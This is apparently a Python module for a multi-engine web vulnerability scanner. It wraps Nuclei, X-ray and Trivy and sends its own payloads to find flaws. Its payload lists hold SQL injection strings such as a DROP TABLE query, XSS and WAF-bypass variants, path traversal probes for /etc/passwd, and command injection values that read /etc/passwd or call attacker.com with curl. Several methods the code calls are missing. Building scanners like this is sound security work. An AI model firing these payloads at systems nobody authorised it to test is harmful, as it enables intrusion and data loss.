"""
Vulnerability Detection Engines - DAST/IAST/SAST Integration
===========================================================

Comprehensive vulnerability detection system integrating:
- DAST: X-ray, AWVS, Nuclei, Custom Payloads
- IAST: Interactive fuzzing with dual-role testing
- SAST: Source code analysis and Docker content scanning
- OOB Manager: Out-of-band vulnerability detection
- WAF Bypass: Evasion techniques and payloads
- Parameter Fuzzing: Advanced input validation testing
"""

import asyncio
import logging
import subprocess
import json
import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Set, Tuple
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
import os
import tempfile
import requests
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor
import hashlib
import base64

logger = logging.getLogger(__name__)

class SeverityLevel(Enum):
    """Vulnerability severity levels"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

class VulnType(Enum):
    """Vulnerability types"""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    CSRF = "csrf"
    XXE = "xxe"
    SSRF = "ssrf"
    RCE = "rce"
    LFI = "lfi"
    RFI = "rfi"
    PATH_TRAVERSAL = "path_traversal"
    AUTH_BYPASS = "auth_bypass"
    BROKEN_ACCESS = "broken_access"
    SENSITIVE_DATA = "sensitive_data"
    CRYPTO_WEAKNESS = "crypto_weakness"
    CONFIGURATION_ERROR = "configuration_error"

@dataclass
class Vulnerability:
    """Vulnerability finding data structure"""
    vuln_id: str
    title: str
    description: str
    severity: SeverityLevel
    vuln_type: VulnType
    url: str
    method: str = "GET"
    parameter: Optional[str] = None
    payload: Optional[str] = None
    evidence: Optional[str] = None
    recommendation: Optional[str] = None
    cve_id: Optional[str] = None
    cwe_id: Optional[str] = None
    cvss_score: Optional[float] = None
    confidence: int = 100
    scanner: str = "custom"
    discovered_at: datetime = field(default_factory=datetime.now)
    request: Optional[str] = None
    response: Optional[str] = None

@dataclass
class ScanConfig:
    """Vulnerability scan configuration"""
    target_urls: List[str]
    scan_types: List[str] = field(default_factory=lambda: ["dast"])
    include_low_severity: bool = False
    max_threads: int = 10
    request_delay: float = 0.5
    timeout: int = 30
    user_agents: List[str] = field(default_factory=list)
    custom_headers: Dict[str, str] = field(default_factory=dict)
    authentication: Optional[Dict[str, str]] = None
    exclude_paths: List[str] = field(default_factory=list)
    oob_callback_domain: Optional[str] = None

class VulnerabilityScanner:
    """
    Multi-engine vulnerability scanner with DAST/IAST/SAST capabilities
    """

    def __init__(self):
        self.session = None
        self.oob_interactions = {}
        self.payloads = self._load_payloads()
        self.waf_bypasses = self._load_waf_bypasses()

        # Scanner executable paths
        self.scanner_paths = {
            'nuclei': 'nuclei',
            'xray': 'xray',
            'awvs': None,  # Commercial scanner - requires license
            'sqlmap': 'sqlmap',
            'nikto': 'nikto',
            'dirb': 'dirb'
        }

        logger.info("Vulnerability Scanner initialized")

    async def run_dast_scan(self, urls: List[str], enable_oob: bool = True,
                          enable_waf_bypass: bool = True) -> List[Vulnerability]:
        """
        Run Dynamic Application Security Testing (DAST)

        Args:
            urls: List of URLs to scan
            enable_oob: Enable out-of-band detection
            enable_waf_bypass: Enable WAF bypass techniques

        Returns:
            List of discovered vulnerabilities
        """
        vulnerabilities = []

        try:
            config = ScanConfig(
                target_urls=urls,
                scan_types=['dast'],
                oob_callback_domain='oob.example.com' if enable_oob else None
            )

            # Phase 1: Nuclei Scanning
            nuclei_vulns = await self._run_nuclei_scan(config)
            vulnerabilities.extend(nuclei_vulns)

            # Phase 2: X-ray Scanning
            xray_vulns = await self._run_xray_scan(config)
            vulnerabilities.extend(xray_vulns)

            # Phase 3: Custom Payload Testing
            custom_vulns = await self._run_custom_payload_scan(config, enable_waf_bypass)
            vulnerabilities.extend(custom_vulns)

            # Phase 4: Parameter Fuzzing
            fuzz_vulns = await self._run_parameter_fuzzing(config)
            vulnerabilities.extend(fuzz_vulns)

            # Phase 5: OOB Detection (if enabled)
            if enable_oob:
                oob_vulns = await self._check_oob_interactions(config)
                vulnerabilities.extend(oob_vulns)

            logger.info(f"DAST scan completed: {len(vulnerabilities)} vulnerabilities found")

        except Exception as e:
            logger.error(f"DAST scan failed: {str(e)}")

        return vulnerabilities

    async def run_iast_scan(self, urls: List[str]) -> List[Vulnerability]:
        """
        Run Interactive Application Security Testing (IAST)

        Args:
            urls: List of URLs for interactive testing

        Returns:
            List of discovered vulnerabilities
        """
        vulnerabilities = []

        try:
            # IAST involves instrumenting the application and monitoring during testing
            # For now, we'll implement a simplified version with intelligent fuzzing

            for url in urls:
                # Interactive fuzzing with feedback
                interactive_vulns = await self._interactive_fuzzing(url)
                vulnerabilities.extend(interactive_vulns)

                # Dual-role testing (authenticated + unauthenticated)
                dual_role_vulns = await self._dual_role_testing(url)
                vulnerabilities.extend(dual_role_vulns)

            logger.info(f"IAST scan completed: {len(vulnerabilities)} vulnerabilities found")

        except Exception as e:
            logger.error(f"IAST scan failed: {str(e)}")

        return vulnerabilities

    async def run_sast_scan(self, target: Any) -> List[Vulnerability]:
        """
        Run Static Application Security Testing (SAST)

        Args:
            target: Target for source code analysis

        Returns:
            List of discovered vulnerabilities
        """
        vulnerabilities = []

        try:
            # Source code analysis
            if hasattr(target, 'source_path'):
                code_vulns = await self._analyze_source_code(target.source_path)
                vulnerabilities.extend(code_vulns)

            # Docker content scanning
            if hasattr(target, 'docker_image'):
                docker_vulns = await self._scan_docker_content(target.docker_image)
                vulnerabilities.extend(docker_vulns)

            # Configuration analysis
            config_vulns = await self._analyze_configurations(target)
            vulnerabilities.extend(config_vulns)

            logger.info(f"SAST scan completed: {len(vulnerabilities)} vulnerabilities found")

        except Exception as e:
            logger.error(f"SAST scan failed: {str(e)}")

        return vulnerabilities

    # DAST Implementation Methods

    async def _run_nuclei_scan(self, config: ScanConfig) -> List[Vulnerability]:
        """Run Nuclei vulnerability scanner"""
        vulnerabilities = []

        try:
            for url in config.target_urls:
                cmd = [
                    self.scanner_paths['nuclei'],
                    '-target', url,
                    '-json',
                    '-severity', 'critical,high,medium',
                    '-rate-limit', '10'
                ]

                result = await self._execute_scanner_command(cmd)

                if result['returncode'] == 0:
                    nuclei_vulns = self._parse_nuclei_output(result['stdout'])
                    vulnerabilities.extend(nuclei_vulns)

        except FileNotFoundError:
            logger.warning("Nuclei not found, skipping Nuclei scan")
        except Exception as e:
            logger.error(f"Nuclei scan failed: {str(e)}")

        return vulnerabilities

    async def _run_xray_scan(self, config: ScanConfig) -> List[Vulnerability]:
        """Run X-ray vulnerability scanner"""
        vulnerabilities = []

        try:
            for url in config.target_urls:
                cmd = [
                    self.scanner_paths['xray'],
                    'webscan',
                    '--basic-crawler', url,
                    '--json-output'
                ]

                result = await self._execute_scanner_command(cmd)

                if result['returncode'] == 0:
                    xray_vulns = self._parse_xray_output(result['stdout'])
                    vulnerabilities.extend(xray_vulns)

        except FileNotFoundError:
            logger.warning("X-ray not found, skipping X-ray scan")
        except Exception as e:
            logger.error(f"X-ray scan failed: {str(e)}")

        return vulnerabilities

    async def _run_custom_payload_scan(self, config: ScanConfig, enable_waf_bypass: bool) -> List[Vulnerability]:
        """Run custom payload testing"""
        vulnerabilities = []

        for url in config.target_urls:
            # SQL Injection testing
            sqli_vulns = await self._test_sql_injection(url, enable_waf_bypass)
            vulnerabilities.extend(sqli_vulns)

            # XSS testing
            xss_vulns = await self._test_xss(url, enable_waf_bypass)
            vulnerabilities.extend(xss_vulns)

            # Command injection testing
            cmd_vulns = await self._test_command_injection(url, enable_waf_bypass)
            vulnerabilities.extend(cmd_vulns)

            # Path traversal testing
            pt_vulns = await self._test_path_traversal(url, enable_waf_bypass)
            vulnerabilities.extend(pt_vulns)

        return vulnerabilities

    async def _run_parameter_fuzzing(self, config: ScanConfig) -> List[Vulnerability]:
        """Advanced parameter fuzzing"""
        vulnerabilities = []

        for url in config.target_urls:
            # Discover parameters first
            parameters = await self._discover_parameters(url)

            for param in parameters:
                # Test each parameter with various payloads
                param_vulns = await self._fuzz_parameter(url, param)
                vulnerabilities.extend(param_vulns)

        return vulnerabilities

    async def _check_oob_interactions(self, config: ScanConfig) -> List[Vulnerability]:
        """Check for out-of-band interactions"""
        vulnerabilities = []

        if not config.oob_callback_domain:
            return vulnerabilities

        # Wait for OOB callbacks
        await asyncio.sleep(30)

        # Check recorded interactions
        for interaction_id, interaction_data in self.oob_interactions.items():
            vuln = Vulnerability(
                vuln_id=f"oob_{interaction_id}",
                title="Out-of-Band Interaction Detected",
                description="The application made an external request to attacker-controlled domain",
                severity=SeverityLevel.HIGH,
                vuln_type=VulnType.SSRF,
                url=interaction_data['original_url'],
                evidence=f"Callback received: {interaction_data['callback_data']}",
                scanner="oob_manager"
            )
            vulnerabilities.append(vuln)

        return vulnerabilities

    # IAST Implementation Methods

    async def _interactive_fuzzing(self, url: str) -> List[Vulnerability]:
        """Interactive application fuzzing with feedback"""
        vulnerabilities = []

        try:
            # Discover application structure
            app_structure = await self._discover_application_structure(url)

            # Intelligent fuzzing based on discovered structure
            for endpoint in app_structure['endpoints']:
                endpoint_vulns = await self._intelligent_endpoint_fuzzing(endpoint)
                vulnerabilities.extend(endpoint_vulns)

        except Exception as e:
            logger.error(f"Interactive fuzzing failed for {url}: {str(e)}")

        return vulnerabilities

    async def _dual_role_testing(self, url: str) -> List[Vulnerability]:
        """Test with both authenticated and unauthenticated contexts"""
        vulnerabilities = []

        try:
            # Test unauthenticated access
            unauth_vulns = await self._test_unauthenticated_access(url)
            vulnerabilities.extend(unauth_vulns)

            # Test authenticated access (if credentials available)
            auth_vulns = await self._test_authenticated_access(url)
            vulnerabilities.extend(auth_vulns)

            # Compare results for privilege escalation issues
            priv_esc_vulns = await self._compare_access_levels(unauth_vulns, auth_vulns)
            vulnerabilities.extend(priv_esc_vulns)

        except Exception as e:
            logger.error(f"Dual role testing failed for {url}: {str(e)}")

        return vulnerabilities

    # SAST Implementation Methods

    async def _analyze_source_code(self, source_path: str) -> List[Vulnerability]:
        """Static source code analysis"""
        vulnerabilities = []

        try:
            # Analyze different languages
            if self._contains_files(source_path, ['.py']):
                python_vulns = await self._analyze_python_code(source_path)
                vulnerabilities.extend(python_vulns)

            if self._contains_files(source_path, ['.js', '.ts']):
                js_vulns = await self._analyze_javascript_code(source_path)
                vulnerabilities.extend(js_vulns)

            if self._contains_files(source_path, ['.java']):
                java_vulns = await self._analyze_java_code(source_path)
                vulnerabilities.extend(java_vulns)

        except Exception as e:
            logger.error(f"Source code analysis failed: {str(e)}")

        return vulnerabilities

    async def _scan_docker_content(self, docker_image: str) -> List[Vulnerability]:
        """Scan Docker image for vulnerabilities"""
        vulnerabilities = []

        try:
            # Use trivy or similar tool for Docker scanning
            cmd = ['trivy', 'image', '--format', 'json', docker_image]
            result = await self._execute_scanner_command(cmd)

            if result['returncode'] == 0:
                trivy_vulns = self._parse_trivy_output(result['stdout'])
                vulnerabilities.extend(trivy_vulns)

        except Exception as e:
            logger.error(f"Docker content scanning failed: {str(e)}")

        return vulnerabilities

    # Vulnerability Testing Methods

    async def _test_sql_injection(self, url: str, enable_waf_bypass: bool) -> List[Vulnerability]:
        """Test for SQL injection vulnerabilities"""
        vulnerabilities = []

        payloads = self.payloads['sqli']
        if enable_waf_bypass:
            payloads.extend(self.waf_bypasses['sqli'])

        for payload in payloads[:20]:  # Limit payloads
            try:
                # Test GET parameters
                test_url = f"{url}?id={payload}"
                response = await self._make_request(test_url)

                if self._detect_sql_error(response):
                    vuln = Vulnerability(
                        vuln_id=f"sqli_{hashlib.md5(test_url.encode()).hexdigest()[:8]}",
                        title="SQL Injection Vulnerability",
                        description="The application is vulnerable to SQL injection attacks",
                        severity=SeverityLevel.HIGH,
                        vuln_type=VulnType.SQL_INJECTION,
                        url=test_url,
                        payload=payload,
                        evidence=response.get('response_body', '')[:500],
                        scanner="custom_sqli"
                    )
                    vulnerabilities.append(vuln)

            except Exception as e:
                logger.debug(f"SQL injection test failed for {url}: {str(e)}")

        return vulnerabilities

    async def _test_xss(self, url: str, enable_waf_bypass: bool) -> List[Vulnerability]:
        """Test for XSS vulnerabilities"""
        vulnerabilities = []

        payloads = self.payloads['xss']
        if enable_waf_bypass:
            payloads.extend(self.waf_bypasses['xss'])

        for payload in payloads[:15]:
            try:
                test_url = f"{url}?q={payload}"
                response = await self._make_request(test_url)

                if payload in response.get('response_body', ''):
                    vuln = Vulnerability(
                        vuln_id=f"xss_{hashlib.md5(test_url.encode()).hexdigest()[:8]}",
                        title="Cross-Site Scripting (XSS) Vulnerability",
                        description="The application is vulnerable to XSS attacks",
                        severity=SeverityLevel.MEDIUM,
                        vuln_type=VulnType.XSS,
                        url=test_url,
                        payload=payload,
                        evidence=f"Payload reflected: {payload}",
                        scanner="custom_xss"
                    )
                    vulnerabilities.append(vuln)

            except Exception as e:
                logger.debug(f"XSS test failed for {url}: {str(e)}")

        return vulnerabilities

    # Helper Methods

    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load vulnerability testing payloads"""
        return {
            'sqli': [
                "' OR '1'='1",
                "' UNION SELECT 1,2,3--",
                "'; DROP TABLE users--",
                "' AND 1=1--",
                "' AND 1=2--",
                "admin'--",
                "' OR 1=1#",
                "'; WAITFOR DELAY '00:00:05'--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>"
            ],
            'cmd_injection': [
                "; ls -la",
                "| whoami",
                "&& id",
                "; cat /etc/passwd",
                "| ping -c 1 127.0.0.1",
                "&& sleep 5",
                "; curl http://attacker.com"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "/var/www/../../etc/passwd"
            ]
        }

    def _load_waf_bypasses(self) -> Dict[str, List[str]]:
        """Load WAF bypass payloads"""
        return {
            'sqli': [
                "' /**/OR/**/'1'='1",
                "'/**/UNION/**/SELECT/**/1,2,3--",
                "' OR 'x'='x",
                "'/*!50000OR*/'1'='1",
                "' OR (1)=(1)--"
            ],
            'xss': [
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<img/src=x/onerror=alert('XSS')>",
                "<svg><script>alert('XSS')</script></svg>",
                "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>"
            ]
        }

    async def _make_request(self, url: str, method: str = "GET", data: Dict = None) -> Dict:
        """Make HTTP request and return response data"""
        try:
            if method == "GET":
                response = requests.get(url, timeout=10)
            else:
                response = requests.post(url, data=data, timeout=10)

            return {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'response_body': response.text
            }
        except Exception as e:
            logger.debug(f"Request failed: {str(e)}")
            return {}

    def _detect_sql_error(self, response: Dict) -> bool:
        """Detect SQL error patterns in response"""
        if not response.get('response_body'):
            return False

        error_patterns = [
            'mysql_fetch_array',
            'ORA-',
            'Microsoft OLE DB',
            'SQLServer JDBC Driver',
            'PostgreSQL',
            'sqlite_',
            'mysql_num_rows',
            'Warning: mysql_'
        ]

        response_body = response['response_body'].lower()
        return any(pattern.lower() in response_body for pattern in error_patterns)

    async def _execute_scanner_command(self, cmd: List[str]) -> Dict:
        """Execute scanner command and return result"""
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await process.communicate()

            return {
                'returncode': process.returncode,
                'stdout': stdout.decode(),
                'stderr': stderr.decode()
            }

        except Exception as e:
            logger.error(f"Scanner command execution failed: {str(e)}")
            return {'returncode': 1, 'stdout': '', 'stderr': str(e)}

    def _parse_nuclei_output(self, output: str) -> List[Vulnerability]:
        """Parse Nuclei JSON output"""
        vulnerabilities = []

        try:
            for line in output.strip().split('\n'):
                if line:
                    data = json.loads(line)
                    vuln = self._nuclei_to_vulnerability(data)
                    if vuln:
                        vulnerabilities.append(vuln)

        except Exception as e:
            logger.error(f"Failed to parse Nuclei output: {str(e)}")

        return vulnerabilities

    def _nuclei_to_vulnerability(self, nuclei_data: Dict) -> Optional[Vulnerability]:
        """Convert Nuclei finding to Vulnerability object"""
        try:
            info = nuclei_data.get('info', {})

            severity_map = {
                'critical': SeverityLevel.CRITICAL,
                'high': SeverityLevel.HIGH,
                'medium': SeverityLevel.MEDIUM,
                'low': SeverityLevel.LOW,
                'info': SeverityLevel.INFO
            }

            return Vulnerability(
                vuln_id=f"nuclei_{nuclei_data.get('template-id', 'unknown')}",
                title=info.get('name', 'Unknown Vulnerability'),
                description=info.get('description', ''),
                severity=severity_map.get(info.get('severity', 'low'), SeverityLevel.LOW),
                vuln_type=VulnType.CONFIGURATION_ERROR,  # Default type
                url=nuclei_data.get('matched-at', ''),
                scanner="nuclei"
            )

        except Exception as e:
            logger.error(f"Failed to convert Nuclei data: {str(e)}")
            return None

logger.info("Vulnerability Scanner module loaded")